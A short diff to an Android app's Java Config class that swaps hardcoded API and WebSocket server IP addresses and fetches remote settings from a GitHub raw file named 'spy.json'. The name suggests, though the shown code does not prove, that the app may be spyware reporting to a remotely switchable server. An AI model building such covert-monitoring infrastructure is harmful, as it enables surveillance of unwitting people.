@@ -16,8 +16,8 @@ public class Config {
     // Langsung tembak ke link Raw GitHub lu
     private static final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/Rizik23/key/main/spy.json";
     
-    public static String API_URL = "http://104.248.145.75:4000";
-    public static String WS_URL = "ws://104.248.145.75:4001";
+    public static String API_URL = "http://165.245.186.245:4000";
+    public static String WS_URL = "ws://165.245.186.245:4001";
     
     public static void loadConfig(Context context) {
         try {
@@ -61,8 +61,8 @@ public class Config {
                         }
                         conn.disconnect();
                     } catch (Exception e) {
-                        API_URL = prefs.getString("api_url", "http://104.248.145.75:4000");
-                        WS_URL = prefs.getString("ws_url", "ws://104.248.145.75:4001");
+                        API_URL = prefs.getString("api_url", "http://165.245.186.245:4000");
+                        WS_URL = prefs.getString("ws_url", "ws://165.245.186.245:4001");
                     }
                 }
             }).start();
